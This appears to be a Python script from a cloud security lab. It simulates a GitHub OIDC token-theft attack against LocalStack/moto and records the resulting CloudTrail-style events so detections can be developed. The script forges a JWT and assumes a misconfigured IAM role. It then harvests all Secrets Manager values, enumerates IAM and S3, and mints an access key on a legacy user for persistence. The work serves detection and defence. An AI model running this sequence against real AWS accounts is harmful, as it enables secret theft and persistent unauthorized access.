"""Replay a Megalodon/Miasma-style credential theft against the lab.

The attacker holds an OIDC token from a workflow they control. LocalStack/moto do
not verify JWT signatures, so a locally forged token is accepted. Real AWS would
reject it; the point of the lab is what happens AFTER a valid token is obtained
because the role trust policy has no `sub` condition.

Events are written in CloudTrail's JSON schema so the detection engine can be
developed offline. Against real AWS, point the detector at actual CloudTrail logs.
"""
from __future__ import annotations

import base64
import json
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Callable

from botocore.exceptions import ClientError

from .scenario import GH_HOST, LEGACY_USER, LEGIT_SUB, SAFE_ROLE, VULN_ROLE

LEGIT_IP = "198.51.100.7"      # documentation range, stands in for our runner egress
ATTACKER_IP = "203.0.113.50"   # documentation range, stands in for the attacker
ATTACKER_SUB = "repo:attacker-org/evil-fork:ref:refs/heads/main"

ClientFactory = Callable[..., Any]


def forge_token(sub: str) -> str:
    def b64(obj: dict[str, Any]) -> str:
        return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()
    claims = {"iss": f"https://{GH_HOST}", "aud": "sts.amazonaws.com", "sub": sub}
    return f"{b64({'alg': 'RS256', 'typ': 'JWT'})}.{b64(claims)}.c2lnbmF0dXJl"


class Recorder:
    """Accumulates CloudTrail-format events with a simulated clock."""

    def __init__(self, account: str):
        self.account = account
        self.events: list[dict[str, Any]] = []
        self._clock = datetime.now(timezone.utc).replace(microsecond=0)

    def add(self, name: str, source: str, identity: dict[str, Any], ip: str,
            request: dict[str, Any] | None = None, response: dict[str, Any] | None = None,
            error: str | None = None, advance: int = 2) -> None:
        self._clock += timedelta(seconds=advance)
        event: dict[str, Any] = {
            "eventVersion": "1.08",
            "eventID": str(uuid.uuid4()),
            "eventTime": self._clock.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "eventSource": source,
            "eventName": name,
            "awsRegion": "us-east-1",
            "sourceIPAddress": ip,
            "userAgent": "Boto3 (pipelineguard-sim)",
            "userIdentity": identity,
            "requestParameters": request or {},
            "responseElements": response,
            "recipientAccountId": self.account,
        }
        if error:
            event["errorCode"] = error
        self.events.append(event)

    def write(self, path: str | Path) -> None:
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            for e in self.events:
                fh.write(json.dumps(e) + "\n")


def _assume(sts: Any, rec: Recorder, role: str, sub: str, ip: str, session: str) -> dict[str, Any] | None:
    role_arn = f"arn:aws:iam::{rec.account}:role/{role}"
    identity = {"type": "WebIdentityUser", "principalId": f"{GH_HOST}:sts.amazonaws.com:{sub}",
                "userName": sub, "identityProvider": GH_HOST}
    try:
        resp = sts.assume_role_with_web_identity(RoleArn=role_arn, RoleSessionName=session,
                                                 WebIdentityToken=forge_token(sub))
    except ClientError as exc:
        rec.add("AssumeRoleWithWebIdentity", "sts.amazonaws.com", identity, ip,
                {"roleArn": role_arn, "roleSessionName": session},
                error=exc.response["Error"]["Code"])
        return None
    rec.add("AssumeRoleWithWebIdentity", "sts.amazonaws.com", identity, ip,
            {"roleArn": role_arn, "roleSessionName": session},
            {"assumedRoleUser": {"arn": f"arn:aws:sts::{rec.account}:assumed-role/{role}/{session}"}})
    return resp["Credentials"]


def _session_identity(account: str, role: str, session: str) -> dict[str, Any]:
    return {"type": "AssumedRole", "principalId": f"AROAEXAMPLE:{session}",
            "arn": f"arn:aws:sts::{account}:assumed-role/{role}/{session}", "accountId": account}


def _call(rec: Recorder, identity: dict[str, Any], ip: str, source: str, name: str,
          fn: Callable[[], Any], request: dict[str, Any] | None = None) -> Any:
    try:
        result = fn()
        rec.add(name, source, identity, ip, request)
        return result
    except ClientError as exc:
        rec.add(name, source, identity, ip, request, error=exc.response["Error"]["Code"])
        return None


def run_attack(make_client: ClientFactory, out_path: str | Path) -> Recorder:
    sts = make_client("sts")
    account = sts.get_caller_identity()["Account"]
    rec = Recorder(account)

    # 1) Legitimate baseline: our pipeline assumes the scoped role from our runner IP.
    creds = _assume(sts, rec, SAFE_ROLE, LEGIT_SUB, LEGIT_IP, "github-actions-legit")
    if creds:
        ident = _session_identity(account, SAFE_ROLE, "github-actions-legit")
        s3 = make_client("s3", creds=creds)
        _call(rec, ident, LEGIT_IP, "s3.amazonaws.com", "ListObjectsV2",
              lambda: s3.list_objects_v2(Bucket="acme-prod-artifacts"), {"bucketName": "acme-prod-artifacts"})

    # 2) Attack: stolen/forged token from an unrelated repo assumes the over-broad role.
    creds = _assume(sts, rec, VULN_ROLE, ATTACKER_SUB, ATTACKER_IP, "attacker-session")
    if creds:
        ident = _session_identity(account, VULN_ROLE, "attacker-session")
        sm = make_client("secretsmanager", creds=creds)
        iam = make_client("iam", creds=creds)
        s3 = make_client("s3", creds=creds)
        listed = _call(rec, ident, ATTACKER_IP, "secretsmanager.amazonaws.com", "ListSecrets",
                       lambda: sm.list_secrets()) or {"SecretList": []}
        for secret in listed["SecretList"]:
            sid = secret["Name"]
            _call(rec, ident, ATTACKER_IP, "secretsmanager.amazonaws.com", "GetSecretValue",
                  lambda sid=sid: sm.get_secret_value(SecretId=sid), {"secretId": sid})
        _call(rec, ident, ATTACKER_IP, "s3.amazonaws.com", "ListBuckets", lambda: s3.list_buckets())
        _call(rec, ident, ATTACKER_IP, "iam.amazonaws.com", "ListRoles", lambda: iam.list_roles())
        _call(rec, ident, ATTACKER_IP, "iam.amazonaws.com", "ListUsers", lambda: iam.list_users())
        _call(rec, ident, ATTACKER_IP, "iam.amazonaws.com", "ListPolicies", lambda: iam.list_policies(Scope="Local"))
        # Persistence: mint a second access key on the legacy user.
        _call(rec, ident, ATTACKER_IP, "iam.amazonaws.com", "CreateAccessKey",
              lambda: iam.create_access_key(UserName=LEGACY_USER), {"userName": LEGACY_USER})

    rec.write(out_path)
    return rec
